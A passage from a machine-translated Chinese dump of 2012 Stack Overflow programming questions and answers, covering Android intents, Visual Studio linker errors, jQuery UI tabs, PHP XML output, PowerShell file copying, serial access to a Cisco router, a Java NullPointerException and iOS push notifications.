                    Picture pic = mediaLibrary.SavePicture(filename, fileStream);
                    fileStream.Close();
                }
            }

            PhotoChooserTask photoChooserTask = new PhotoChooserTask();
            photoChooserTask.Show();
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:23:58.720

这是我的片段，可能会对您有所帮助。

我认为你的问题在于你的`OpenFile`方法。

```
 // Create a filename for JPEG file in isolated storage.
 String tempJPEG = "logo.jpg";
 // Create virtual store and file stream.
 using (IsolatedStorageFile myIsolatedStorage = IsolatedStorageFile.GetUserStoreForApplication())
 {

     IsolatedStorageFileStream fileStream = myIsolatedStorage.CreateFile(tempJPEG);

  // Encode WriteableBitmap object to a JPEG stream.
     Extensions.SaveJpeg(img, fileStream, img.PixelWidth, img.PixelHeight, 0, 85);
     fileStream.Close();
   } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-04T12:33:23.857

```
MessageBar.Text = "Uploading to SkyDrive";
IsolatedStorageFileStream fileStream = null;
//string strSaveName = "images.jpg";               
try
{
   using (IsolatedStorageFile store = IsolatedStorageFile.GetUserStoreForApplication())
   {
      fileStream = store.OpenFile("contact.txt", FileMode.Open, FileAccess.Read);
   }
}
catch (Exception ex)
{
    MessageBox.Show(ex.Message);
}
client.UploadAsync("me/SkyDrive", "contact.txt", fileStream, OverwriteOption.Overwrite); 
```

# android - 最大编号是多少。在android应用程序中可以使用intent传递的数字？

> ID：13125502
> 
> 赞同：0
> 
> 时间：2012-10-29T16:15:56.873
> 
> 标签：android, android-intent

我是android新手，所以我只是想制作一个简单的应用程序，它需要一个整数数据，而不是一个手机号码。从一个活动到另一个活动（在这两个活动中，它都存储在编辑文本中）。我在发件人活动中使用了以下代码-

```
done.setOnClickListener(new View.OnClickListener() {

        public void onClick(View v) {
            // TODO Auto-generated method stub
            Intent i=new Intent(ctx,MainActivity.class);
            i.putExtra("number", Long.parseLong(edittext.getText().toString()));
            ctx.startActivity(i);
        }
    }); 
```

以下是接收器活动中的接收代码——

```
num=getIntent().getIntExtra("number", set_default);
    accept(num);

protected void accept(long t) {
    // TODO Auto-generated method stub
    edittext=(EditText)findViewById(R.id.editText1);
    String a=(edittext.getText().toString()+t);
    clear(edittext);
    edittext.append(a);
}
private void clear(EditText edittext) {
    // TODO Auto-generated method stub
    edittext.setText("");

} 
```

num 是 long 类型。

上述代码的问题在于它可以正常工作到 8 位数字，但不能从 9 位开始。以前我在发件人活动中将 int 与 num 和 int.parseInt 与 putExtra 一起使用，但在问题发生后很久才更改，但它保留了。

谁能帮我解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:18:49.903

你还在用`getIntExtra`。使用[`getLongExtra`](http://developer.android.com/reference/android/content/Intent.html#getLongExtra%28java.lang.String,%20long%29).

```
num=getIntent().getLongExtra("number", (long) set_default); 
```

# c++ - 从 VS2005 升级 VS2008（或 VS2010）期间出现 LNK2001 和 LNK2019 错误

> ID：13125506
> 
> 赞同：1
> 
> 时间：2012-10-29T16:16:18.480
> 
> 标签：c++, visual-studio-2008, linker

我正在尝试将旧的 VC6 解决方案升级到 VS2010。一切都编译得很好（经过一些代码更改以处理一些 VC++ 更改），但它拒绝链接。我有 6 个静态库——全部设置为“在共享 DLL 中使用 MFC”和“不使用 ATL”——Unicode 字符集，以及一个应用程序 (.EXE) 设置为“使用标准 Windows 库”和“不使用 ATL” "（当然也是 Unicode）。此解决方案使用 Visual Studio 2005 (SP1) 可以很好地编译/链接，但在 VS2008 和 VS2010 上链接都失败。错误消息主要与“CStringT”有关。从我研究过的所有内容来看，我也应该在 VS2005 中看到这些 CStringT 链接错误（即当 CString 更改为模板类时），但正如我所说，它在 VS2005 中链接正常。我已经尝试了每一个技巧& 已在此处和其他地方推荐的技巧（即在我的 stdafx.h 标头中显式导入 CStringT 的模板类），但没有运气。有人有什么新想法吗？我将粘贴下面的错误示例以供参考。谢谢！

```
error LNK2001: unresolved external symbol "public: class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class ATL::ChTraitsCRT<wchar_t> > > const & __thiscall SomeExceptionClass::GetErrorMessage(void)const " (?GetErrorMessage@SomeExceptionClass@@QBEABV?$CStringT@_WV?$StrTraitMFC@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@XZ)   

error LNK2001: unresolved external symbol "public: class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class ATL::ChTraitsCRT<wchar_t> > > const & __thiscall SomeExceptionClass::GetErrorMessage(void)const " (?GetErrorMessage@SomeExceptionClass@@QBEABV?$CStringT@_WV?$StrTraitMFC@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@XZ)

error LNK2019: unresolved external symbol "public: class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class ATL::ChTraitsCRT<wchar_t> > > const & __thiscall SomeExceptionClass::GetErrorMessage(void)const " (?GetErrorMessage@SomeExceptionClass@@QBEABV?$CStringT@_WV?$StrTraitMFC@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@XZ) referenced in function __catch$?Init@SomeOtherClass@@QAEHPA_W00000@Z$0

error LNK2001: unresolved external symbol "public: class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class ATL::ChTraitsCRT<wchar_t> > > const & __thiscall SomeExceptionClass::GetErrorMessage(void)const " (?GetErrorMessage@SomeExceptionClass@@QBEABV?$CStringT@_WV?$StrTraitMFC@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@XZ)

error LNK2001: unresolved external symbol "public: class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class ATL::ChTraitsCRT<wchar_t> > > const & __thiscall SomeExceptionClass::GetErrorMessage(void)const " (?GetErrorMessage@SomeExceptionClass@@QBEABV?$CStringT@_WV?$StrTraitMFC@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@XZ)

error LNK2001: unresolved external symbol "public: class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class ATL::ChTraitsCRT<wchar_t> > > const & __thiscall SomeExceptionClass::GetErrorMessage(void)const " (?GetErrorMessage@SomeExceptionClass@@QBEABV?$CStringT@_WV?$StrTraitMFC@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@XZ)

error LNK2001: unresolved external symbol "public: void __thiscall SomeDatabaseClass::ExecDirect(class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class ATL::ChTraitsCRT<wchar_t> > > const &)" (?ExecDirect@SomeDatabaseClass@@QAEXABV?$CStringT@_WV?$StrTraitMFC@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@@Z)

error LNK2001: unresolved external symbol "public: void __thiscall SomeDatabaseClass::ExecDirect(class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class ATL::ChTraitsCRT<wchar_t> > > const &)" (?ExecDirect@SomeDatabaseClass@@QAEXABV?$CStringT@_WV?$StrTraitMFC@_WV?$ChTraitsCRT@_W@ATL@@@@@ATL@@@Z) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T16:59:36.997

呃！这大概总结了这个解决方案。出于某种奇怪的原因，在升级旧的 VC6 项目时，VS2008 和 VS2010 在处理“附加链接依赖项”方面做得非常糟糕（而 VS2005 似乎处理得很好）。我所缺少的只是进入 VS2010 中的链接选项（在加载和升级我的旧 VC6 工作区/项目之后）并将我的五个静态库（lib1.lib、lib2.lib 等）添加到“附加依赖项”字段（链接器-> 输入），然后将我的输出文件夹 [s]（创建这些 .LIB 文件的位置）添加到“附加库目录”字段（链接器-> 常规） - 所有在我的实际 .EXE 项目的属性下课程。繁荣，现在它像魅力一样链接。我对这些 CString/模板升级问题（来自 MSDN 文章等）的“红鲱鱼”非常感兴趣。），我完全错过了明显的。希望这对未来的人有所帮助。:)

# jquery - Jquery UI 选项卡 - 多个选项卡（垂直）问题

> ID：13125509
> 
> 赞同：0
> 
> 时间：2012-10-29T16:16:27.870
> 
> 标签：jquery, user-interface, tabs

我有两个标签。本质上，选项卡中的选项卡。这是一个例子：**图片：http: [//i45.tinypic.com/35k0uhg.png](http://i45.tinypic.com/35k0uhg.png)**

**标签**为红色
**子标签**为蓝色

**选项卡**应该是垂直的（*正常工作*），而**子选项卡**是水平的。但是，正如您在上面看到的，**子选项卡**也是垂直的。由于一些奇怪的原因，我无法弄清楚如何在**选项卡**保持垂直时使**子选项卡**水平。

 ****子选项卡**应该如下所示：

**图片：http: [//i47.tinypic.com/k9c01d.png](http://i47.tinypic.com/k9c01d.png)**

**标签**代码

 **```
#tabs {
    position: relative;
    padding-left: 14.5em; /* content */
    margin-right: 5px;
    padding-top: 20px;
    background: transparent;
    border: none;
    /*  height: 30em; */
}

#tabs .nav {
    position: absolute;
    left: 0.25em;
    top: 1.5em;
    bottom: 0.25em;
    width: 16em; /* tabs width */
    padding: 0.2em 0 0.2em 0.2em;
    background: transparent;
    border: none;
}

#tabs .nav li {
    right: 1px;
    width: 100%;
    border: none;
    overflow: hidden;
}

#tabs .nav li a {
    float: left;
    width: 100%;
    margin-bottom: 3px;
    height: 24px;
    padding-top: 14px;
    padding-left: 15px;
    font-weight: bold;
    color: #2e2e2e;
    background: #fff;
}

#tabs .nav li a:hover {
    cursor: pointer;
    background: #206fbf;
    color: #fff;
}

#tabs  .nav li.ui-tabs-selected a {
    cursor: pointer;
    color: #fff;
    background: #206fbf;
} 
```

**子标签的**代码

 **```
#Sub-Tabs {
    background: transparent;
    border: none;
    position: none;
    list-style: none;
}
#Sub-Tabs .ui-widget-header {
    background: transparent;
    border: none;
    border-bottom: 1px solid #c0c0c0;
    -moz-border-radius: 0px;
    -webkit-border-radius: 0px;
    border-radius: 0px;
    position: none;
}
#Sub-Tabs .ui-state-default {
    background: transparent;
    border: none;
}
#Sub-Tabs .ui-state-active {
    background: transparent url(img/uiTabsArrow.png) no-repeat bottom center;
    border: none;
}
#Sub-Tabs .ui-state-default a {
    color: #c0c0c0;
}
#Sub-Tabs .ui-state-active a {
    color: #459E00;
} 
```

HTML部分：

```
<div id="tabs">
    <ul class="nav">
        <li><a href="#test">Testing Area</a></li>
        <li><a href="#upgradereq">Upgrade Requirements</a></li>

    </ul>

    <div id="test">
        <div id="sub-tabs">
            <ul>
                <li><a href="#helloworld">Hello World</a></li>
                <li><a href="#main">Main</a></li>
            </ul>

            <div id="helloworld">Hellow rold!</div>
            <div id="main">afsa</div>
        </div>
    </div>

    <div id="upgreadereq">afsa</div>
</div> 
```

感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:22:00.147

查看您的 HTML 会有所帮助，但真正的问题是您的 CSS。`#tabs .nav li`将在 element 中使用 class .nav 获取每个元素下的每个 li `#tabs`。换句话说，这里有极端重叠的 CSS。

尝试使用一些子选择器，例如：

```
#tabs .nav > li {}
/* Where ">" says 'Hey, grab only the li elements immediately within .nav!' */ 
```

此外，有关 jQueryUI 如何执行此操作的更多信息，[请参见此处](http://jqueryui.com/tabs/#vertical)

[这是 jsFiddle](http://jsfiddle.net/SpYk3/QHNTu/)供您使用和试用。******

# php - 使用 PHP 从 XML 文件中删除空格

> ID：13125517
> 
> 赞同：0
> 
> 时间：2012-10-29T16:16:46.887
> 
> 标签：php, xml

我有一个脚本，通过 PHP 将 XML 数据附加到 XML 文件的末尾。唯一的问题是，在我通过 PHP 脚本添加的每一行 XML 之后，都会创建一个额外的行（空白）。有没有办法用 PHP 从 XML 文件中删除空格而不丢失格式整齐的 XML 文件？这是写入 XML 文件的 PHP 代码：

```
<?php

function formatXmlString($xml) {  

  // add marker linefeeds to aid the pretty-tokeniser (adds a linefeed between all tag-end boundaries)
  $xml = preg_replace('/(>)(<)(\/*)/', "$1\n$2$3", $xml);

  // now indent the tags
  $token      = strtok($xml, "\n");
  $result     = ''; // holds formatted version as it is built
  $pad        = 0; // initial indent
  $matches    = array(); // returns from preg_matches()

  // scan each line and adjust indent based on opening/closing tags
  while ($token !== false) : 

  // test for the various tag states

 // 1\. open and closing tags on same line - no change
 if (preg_match('/.+<\/\w[^>]*>$/', $token, $matches)) : 
   $indent=0;
 // 2\. closing tag - outdent now
 elseif (preg_match('/^<\/\w/', $token, $matches)) :
   $pad=0;
 // 3\. opening tag - don't pad this one, only subsequent tags
 elseif (preg_match('/^<\w[^>]*[^\/]>.*$/', $token, $matches)) :
   $indent=4;
 // 4\. no indentation needed
 else :
   $indent = 0; 
 endif;

 // pad the line with the required number of leading spaces
 $line    = str_pad($token, strlen($token)+$pad, ' ', STR_PAD_LEFT);
 $result .= $line . "\n"; // add to the cumulative result, with linefeed
 $token   = strtok("\n"); // get the next token
 $pad    += $indent; // update the pad size for subsequent lines    
 endwhile; 

return $result;
}

function append_xml($file, $content, $sibling, $single = false) {
    $doc = file_get_contents($file);
    if ($single) {
        $pos = strrpos($doc, "<$sibling");
        $pos = strpos($doc, ">", $pos) + 1;
    }
    else {
       $pos = strrpos($doc, "</$sibling>") + strlen("</$sibling>");
    }
    return file_put_contents($file, substr($doc, 0, $pos) . "\n$content" . substr($doc, $pos));
}  

$content = "<product><id>3</id><name>Product 3</name><price>63.00</price></product>";
append_xml('prudcts.xml', formatXmlString($content), 'url');  

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:20:59.670

不要只是把所有东西放在一行中，你会更灵活：

```
 return file_put_contents($file, substr($doc, 0, $pos) . "\n$content" . substr($doc, $pos)); 
```

相反（建议）：

```
 $buffer = substr($doc, 0, $pos) . "\n$content" . substr($doc, $pos);
 $buffer = rtrim($buffer);
 return file_put_contents($file, $buffer); 
```

PS：使用[`DomDocument`](http://php.net/DomDocument)可能比字符串函数更直接，并且可以保存 XML 处理。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-29T16:18:55.887

不要将新数据追加到`$result`换行符上，而是执行相反的操作。

使用类似`if( !empty($result) ) { result .= "\n" }`的方法来避免以换行符开始 XML 数据。

# authentication - SSL 客户端证书窗口

> ID：13125518
> 
> 赞同：0
> 
> 时间：2012-10-29T16:16:58.487
> 
> 标签：authentication, iis, ssl, certificate, offline

我需要通过客户端证书离线进行 iis 身份验证。我的iis没有在线注册。它需要离线完成。我在 IIS 中配置了 SSL。我设法在本地手动创建 csr 文件并发送到我能够颁发证书的 CA 注册服务器。我导出了 cer 并导入了我的客户端计算机，但在访问 iis 应用程序时它没有使用我的证书，我收到“HTTP 错误 403.7 - 禁止：需要 SSL 客户端证书”。如何解决它。有人可以帮助我逐步完成程序。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-06T09:34:48.637

签入 IIS。转到网站-> SSL 设置

请接受它代替 require ，它会为您工作。

# powershell-2.0 - Powershell通配符排除文件名的结尾

> ID：13125521
> 
> 赞同：0
> 
> 时间：2012-10-29T16:17:08.237
> 
> 标签：powershell-2.0

我有一个文件夹，其中包含由 3rd 方程序生成的以下格式的文件。

Database_Server1_tempdb_29_10_2012_00_22_00.pdf Database_Server1_tempdb_28_10_2012_00_21_14.pdf Database_Server1_tempdb_27_10_2012_00_10_00.pdf 等

我想仅使用文件 dd_mm_yyyy 中的日期格式并忽略时间戳 nn_nn_nn.pdf 从 7 天前复制其中一个文件

因此，使用以前的脚本来测试我是否作弊并将文件格式设为 Database_Server1_tempdb_22_10_2012.pdf

以下代码工作正常。

$过去天 = -7

$pastdate = [日期时间]::Now.AddDays($pastdays)

$filename -match "Database_Server1_tempdb_" + $pastdate.Day + " *" + $pastdate.Month + "* " + $pastdate.Year+ ".pdf"

Copy-Item -Path "V:\Capacity Manager Size reports\$($filename)" "\Server2\report_Archive"

任何人都可以帮助它工作，所以我不需要作弊，它只是忽略 dd_mm_yy 之后的任何内容以进行匹配。

谢谢

莫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T08:14:59.067

你这样做是不对的。您试图猜测名称，而不是从文件夹中获取所有文件并选择匹配的文件，如下所示：

```
$pastdays = -7
$pastdate = [datetime]::Now.AddDays($pastdays)
$files = Get-ChildItem "V:\Capacity Manager Size reports\"
$filename = ($files | Where-Object {$_.Name -like "Database_Server1_tempdb_" + $pastdate.Day  + "_" + $pastdate.Month + "_" + $pastdate.Year+ "*.pdf"})
Copy-Item -Path $filename.FullName "\Server2\report_Archive" 
```

# c - 通过串行接口使用 C++ 连接到 cisco 路由器

> ID：13125526
> 
> 赞同：0
> 
> 时间：2012-10-29T16:17:23.373
> 
> 标签：c, linux, serial-port, cisco, hardware-interface

我想从我的 c++ 应用程序连接到 Cisco 路由器。需要它才能获得接口状态。我的 linux 站（Ubuntu）和路由器通过串行接口连接。

从 puty 或 minicom 或控制台连接工作连接。

例如：

```
root@test:/etc/minicom# cu -l /dev/ttyS0 -s 9600
Connected.

Router#show int summary

 *: interface is up
 IHQ: pkts in input hold queue     IQD: pkts dropped from input queue
 OHQ: pkts in output hold queue    OQD: pkts dropped from output queue
 RXBS: rx rate (bits/sec)          RXPS: rx rate (pkts/sec)
 TXBS: tx rate (bits/sec)          TXPS: tx rate (pkts/sec)
 TRTL: throttle count 
```

现在我尝试对 C++ (或 C) 做同样的事情，但读挂起。

我的c代码：

```
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <termios.h>
#include <unistd.h>
#include <iostream>
#include<stdio.h>
#include<sys/ioctl.h>
#include<unistd.h>
#include<fcntl.h>
using namespace std;
int fd1;
int fd2;
char *buff, *buffer, *bufptr;
int wr, rd, nbytes, tries;

int configure_port(int fd)      // configure the port
        {
    struct termios port_settings;     // structure to store the port settings in
    bzero(&port_settings, sizeof(port_settings));
    cfsetispeed(&port_settings, B9600);    // set baud rates
    cfsetospeed(&port_settings, B9600);

    port_settings.c_cflag &= ~PARENB;    // set no parity, stop bits, data bits
    port_settings.c_cflag &= ~CSTOPB;
    port_settings.c_cflag &= ~CSIZE;
    port_settings.c_cflag |= CS8;

    tcsetattr(fd, TCSANOW, &port_settings);    // apply the settings to the port
    return (fd);

}
int main() {
    fd1 = open("/dev/ttyS0", O_RDWR | O_NOCTTY | O_NDELAY);
    if (fd1 == -1) {
        perror("open_port: Unable to open /dev/ttyS0 – ");
    } else {
        fcntl(fd1, F_SETFL, 0);
    }
    printf("Port 1 has been sucessfully opened and %d is the file description\n",fd1);
    configure_port(fd1);

wr = write(fd1, "\r", 1);
cout << " wr status " << wr << endl;
wr = write(fd1, "\r", 1);
cout << " wr  status " << wr << endl;
wr = write(fd1, "ena\r", 4);
cout << " wr status " << wr << endl;
wr = write(fd1, "show int sum\r", 13);
cout << " wr status " << wr << endl;
rd = read(fd1, buff, 50);
cout << " rd status " << rd << endl;
cout << rd << endl;
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T09:07:30.427

这项工作-可能缺少睡眠。

```
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <termios.h>
#include <unistd.h>
#include <iostream>
#include<stdio.h>
#include<sys/ioctl.h>
#include<unistd.h>
#include<fcntl.h>

using namespace std;

int set_interface_attribs(int fd, int speed, int parity) {
    struct termios tty;
    memset(&tty, 0, sizeof tty);
    if (tcgetattr(fd, &tty) != 0) {
        printf("err");//error_message("error %d from tcgetattr", errno);
        return -1;
    }

    cfsetospeed(&tty, speed);
    cfsetispeed(&tty, speed);

    tty.c_cflag = (tty.c_cflag & ~CSIZE) | CS8;     // 8-bit chars
    // disable IGNBRK for mismatched speed tests; otherwise receive break
    // as \000 chars
    tty.c_iflag &= ~IGNBRK;         // ignore break signal
    tty.c_lflag = 0;                // no signaling chars, no echo,
                                    // no canonical processing
    tty.c_oflag = 0;                // no remapping, no delays
    tty.c_cc[VMIN] = 0;            // read doesn't block
    tty.c_cc[VTIME] = 5;            // 0.5 seconds read timeout

    tty.c_iflag &= ~(IXON | IXOFF | IXANY); // shut off xon/xoff ctrl

    tty.c_cflag |= (CLOCAL | CREAD); // ignore modem controls,
                                     // enable reading
    tty.c_cflag &= ~(PARENB | PARODD);      // shut off parity
    tty.c_cflag |= parity;
    tty.c_cflag &= ~CSTOPB;
    tty.c_cflag &= ~CRTSCTS;

    if (tcsetattr(fd, TCSANOW, &tty) != 0) {
        printf("err");//error_message("error %d from tcsetattr", errno);
        return -1;
    }
    return 0;
}

void set_blocking(int fd, int should_block) {
    struct termios tty;
    memset(&tty, 0, sizeof tty);
    if (tcgetattr(fd, &tty) != 0) {
        printf("err");//error_message("error %d from tggetattr", errno);
        return;
    }

    tty.c_cc[VMIN] = should_block ? 1 : 0;
    tty.c_cc[VTIME] = 5;            // 0.5 seconds read timeout

    if (tcsetattr(fd, TCSANOW, &tty) != 0)
        printf("err");//error_message("error %d setting term attributes", errno);
}

int main(int argc, char **argv) {
    char *portname = "/dev/ttyS0";
    int fd = open (portname, O_RDWR | O_NOCTTY | O_SYNC);
    if (fd < 0) {
        printf("err");//error_message("error %d opening %s: %s", errno, portname,strerror(errno));
        return -1;
    }

    set_interface_attribs(fd, B9600, 0); // set speed to 115,200 bps, 8n1 (no parity)
    set_blocking(fd, 0);                // set no blocking
    write(fd, "\r", 1);           // send 7 character greeting
    write(fd, "\r", 1);
    usleep(100000);
    char buf[1000];
    write(fd, "ena\r", 4);
    memset(&buf, 0, sizeof buf);
    usleep(100000);
    write(fd, "show int sum\r", 15);
    sleep(1);
    memset(&buf, 0, sizeof buf);
    int n = read(fd, buf, sizeof buf); // read up to 100 characters if ready to read
    cout << " n " << n << endl;
    cout << " buf " << buf <<  endl;
    close(fd);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:40:03.600

在修改它之前，您不会`port_settings`先将结构归零。这肯定是一个错误，尽管它可能不是问题的根源。您是否尝试过构建互联网上提供的数十个“termios 示例程序”中的一个以进行比较？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T09:15:00.470

You should use SNMP to get interface status/statistics instead of connecting to serial console.

This is exact purpose what was SNMP designed for.

# java - 对象数组 java.lang.NullPointerException

> ID：13125527
> 
> 赞同：0
> 
> 时间：2012-10-29T16:17:24.827
> 
> 标签：java, arrays, object, nullpointerexception

我想创建一个对象数组，但我得到一个`java.lang.NullPointerException`. 目前我不知道为什么，也找不到错误。该类将保存在 GAE 数据存储中。如果有人能告诉我出了什么问题，那就太好了。

我做了什么：

```
@Transient private int plc = 0;
@Transient private Profile[] players = new Profile[4];

public void setPlayers(Profile player) {
    if (plc < 4) {
        this.players[plc] = new Profile(); // Exception
        this.players[plc] = player;
        plc++;
    }
} 
```

我想念什么？

**配置文件构造函数**

```
public Profile() {
}

public Profile(String account, String name, int gender) {
    this.account = account;
    this.name = name;
    this.gender = gender;
} 
```

**追踪追踪**

```
java.lang.NullPointerException
    at packgesname.Game.setPlayers(Game.java:40)
    at packgesname.JsonServlet.joinParty(JsonServlet.java:115)
    at packgesname.JsonServlet.doGet(JsonServlet.java:47)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:617)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
    at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:511)
    at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1166)
    at com.google.appengine.api.socket.dev.DevSocketFilter.doFilter(DevSocketFilter.java:74)
    at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1157)
    at com.google.appengine.tools.development.ResponseRewriterFilter.doFilter(ResponseRewriterFilter.java:110)
    at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1157)
    at com.google.appengine.tools.development.HeaderVerificationFilter.doFilter(HeaderVerificationFilter.java:34)
    at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1157)
    at com.google.appengine.api.blobstore.dev.ServeBlobFilter.doFilter(ServeBlobFilter.java:61)
    at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1157)
    at com.google.apphosting.utils.servlet.TransactionCleanupFilter.doFilter(TransactionCleanupFilter.java:43)
    at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1157)
    at com.google.appengine.tools.development.StaticFileFilter.doFilter(StaticFileFilter.java:125)
    at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1157)
    at com.google.appengine.tools.development.BackendServersFilter.doFilter(BackendServersFilter.java:97)
    at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1157)
    at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:388)
    at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216)
    at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:182)
    at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:765)
    at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:418)
    at com.google.appengine.tools.development.DevAppEngineWebAppContext.handle(DevAppEngineWebAppContext.java:94)
    at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)
    at com.google.appengine.tools.development.JettyContainerService$ApiProxyHandler.handle(JettyContainerService.java:380)
    at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)
    at org.mortbay.jetty.Server.handle(Server.java:326)
    at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:542)
    at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:923)
    at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:547)
    at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:212)
    at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404)
    at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:409)
    at org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:582) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:36:01.753

您已`players`使用`@Transient`注释进行了标记。我不知道这个库来自哪个库，但它可能没有将其设置为一个值，因为它可能没有调用构造函数（因此在那里对其进行初始化），也没有设置值（因为它是瞬态的）。尝试像这样懒惰地初始化它：

```
public void setPlayers(Profile player) {
    if (this.players == null)
        this.players = new Profile[4];
    if (plc < 4) {
        this.players[plc] = new Profile(); // Exception
        this.players[plc] = player;
        plc++;
    }
} 
```

请记住，序列化库不会以任何方式序列化瞬态值，并且新对象将具有`null`瞬态字段，即使您在构造函数中初始化它们也是如此。这是因为对于大多数序列化库，对象是由库*分配*而不是*构造*的，然后在分配后设置其值。这会跳过您的构造函数，并且不会将瞬态初始化`players`为任何内容，而将其保留为`null`.

如果你想确定，在构造函数中放置一个断点并序列化你的对象，然后反序列化它。如果反序列化调用构造函数（即通过反射或一些类似的机制），那么它将命中您的断点。如果没有，那么这就是你的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:23:40.303

您的`Profile`构造函数中可能有问题，是否有一些代码可以在`NullPointerException`那里抛出？

# ios - 滑动推送通知应该打开相关新闻

> ID：13125530
> 
> 赞同：-2
> 
> 时间：2012-10-29T16:17:28.807
> 
> 标签：ios, apple-push-notifications

我是 iPhone 开发的新手，但设法在我的 iOS 应用程序中接收推送通知。但是，当我刷掉传入的推送通知时，它只会打开应用程序，而不是通知的相关帖子。

这是我的代码：

```
- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo{
NSLog(@"Eine Nachricht ist angekommen, während die App aktiv ist");

NSString* alert = [[userInfo objectForKey:@"aps"] objectForKey:@"id"];

NSLog(@"Nachricht: %@", alert);

//This is to inform about new messages when the app is active

//UIApplicationState state = [[UIApplication sharedApplication] applicationState];
//if (state == UIApplicationStateActive) {
//    UIAlertView* alertView = [[UIAlertView alloc] initWithTitle:@"Neuer Artikel" message:@"Nachricht" delegate:nil cancelButtonTitle:@"Ok" otherButtonTitles:nil];
//    [alertView show];
//    }
}

- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken {
NSLog(@"Device Token=%@", deviceToken);

NSUInteger theCount = [deviceToken length];
NSMutableString *theString = [NSMutableString stringWithCapacity:2 * theCount];
unsigned char const *theBytes = [deviceToken bytes];

for(NSUInteger i = 0; i < theCount; ++i) {
    [theString appendFormat:@"%2.2x", theBytes[i]];
}

NSString* url = [NSString stringWithFormat:@"HERE_IS_MY_REGISTERING_URL",theString,theString];
NSLog(@"APNS URL : %@",url);

NSURLRequest* request = [NSURLRequest requestWithURL:[NSURL URLWithString:[url stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]]];

[NSURLConnection sendAsynchronousRequest:request queue:[NSOperationQueue currentQueue] completionHandler:^(NSURLResponse *urlResponse, NSData *data, NSError *error) {
    if (error) {
        NSLog(@"Error: %@", error);
    }
}];
}

- (void)application:(UIApplication *)application didFailToRegisterForRemoteNotificationsWithError:(NSError *)error{
    NSLog(@"Error bei der Registrierung");

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
self.window.frame = [[UIScreen mainScreen] bounds];
[self setApplicationDefaults];
[[UIApplication sharedApplication] setStatusBarHidden:NO];
//This is the start of the push notification settings
[self.window makeKeyAndVisible]; 
```

现在，我不知道该放什么，打开一个推送通知的相关帖子......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-30T13:12:23.510

你能指望什么？从您的代码中，我看不到您提供了有关要打开哪个帖子的任何信息。Apple、Xcode 或您的代码都不会神奇地知道这一点。

在推送通知的有效负载中，您必须提供您所指的帖子的信息，然后在您的 didReceiveRemoteNotification 中阅读此信息。

